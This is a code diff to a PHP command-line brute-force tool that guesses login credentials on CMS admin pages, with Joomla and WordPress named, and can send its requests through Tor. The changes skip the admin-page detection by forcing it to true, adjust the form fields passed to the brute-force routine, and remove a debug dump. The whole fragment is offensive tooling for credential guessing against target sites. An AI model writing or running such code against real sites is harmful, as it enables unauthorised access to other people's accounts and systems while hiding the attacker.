@@ -252,7 +252,8 @@ class BruteForceController extends Command{
                 $site = new Site($valueTarget);
                 $site->setTor($tor);
                 //$resultIsJoomla=$site->isJoomla();
-                $resultIsAdmin=$site->isAdmin();
+                //$resultIsAdmin=$site->isAdmin();
+                $resultIsAdmin=true;
                 if($resultIsAdmin)
                 {
                     $usernameField  = $site->getNameFieldUsername();
@@ -262,7 +263,7 @@ class BruteForceController extends Command{
                     $excludeValues[]=$usernameField;
                     $excludeValues[]=$passwordField;
                     $otherFields=$site->getOthersField(array_merge($usernameField,$passwordField));
-                    $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields);
+                    $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields[$actionForm]);
                     if($resultOfBruteForce)
                     {
 
@@ -279,9 +280,6 @@ class BruteForceController extends Command{
 
             }
         }
-        var_dump($resultFinal);
-
-
     }
 
     protected function sendDataToLoginWordPress($username,$password,$target,$tor=""){
